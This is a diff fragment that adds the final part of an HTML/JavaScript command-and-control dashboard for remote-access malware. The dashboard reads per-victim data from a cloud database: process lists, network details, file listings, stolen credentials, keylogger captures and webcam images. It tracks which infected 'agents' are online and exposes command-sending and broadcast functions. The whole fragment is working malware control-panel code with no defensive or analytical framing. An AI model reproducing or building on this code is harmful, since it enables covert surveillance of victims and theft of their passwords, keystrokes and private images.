+  function fetchProcesses(id) { get(ref(db, `processes/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No process data.', 'error'); log('--- PROCESSES ---', 'success'); Object.values(d).forEach(p => log(`  ${p.pid}\t${p.name}\t${p.mem}`)); log(''); }); }
+  function fetchNetwork(id) { get(ref(db, `network/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No network data.', 'error'); log('--- NETWORK ---', 'success'); Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`)); log(''); }); }
+  function fetchFiles(id) { get(ref(db, `files/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No file listing.', 'error'); log('--- FILES ---', 'success'); Object.values(d).forEach(f => log(`  ${f.name}\t${f.size}\t${f.modified}`)); log(''); }); }
+  function fetchCreds(id) { get(ref(db, `creds/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No creds yet.', 'warn'); log('--- CREDS ---', 'success'); Object.entries(d).forEach(([k,v]) => log(`  ${k}: ${v}`)); log(''); }); }
+  function fetchKeylog(id) { get(ref(db, `keylog/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No keylog.', 'warn'); log('--- KEYLOG ---', 'success'); Object.values(d).forEach(k => log(`  [${new Date(k.t).toLocaleTimeString()}] ${k.text}`)); log(''); }); }
+  function fetchWebcam(id) { get(ref(db, `webcam/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No webcam.', 'warn'); log('--- WEBCAM ---', 'success'); Object.values(d).forEach(w => { if (w.img) logImage(w.img); }); log(''); }); }
+  function fetchLogs(id) { get(ref(db, `logs/${id}`)).then(s => { const d = s.val(); if (!d) return log('[!] No logs.', 'error'); log('--- LOGS ---', 'success'); Object.values(d).forEach(l => log(`  [${l.time}] ${l.text}`)); log(''); }); }
+
+  setInterval(() => {
+    const now = Date.now();
+    Object.entries(pcs).forEach(([id, pc]) => {
+      if (pc.lastSeen && (now - pc.lastSeen) > 60000 && pc.online) set(ref(db, `agents/${id}/online`), false);
+    });
+  }, 15000);
+
+  window.__dash = { log, sendCommand, broadcast, activePC: () => activePC };
+}
+</script>
+</body>
+</html>
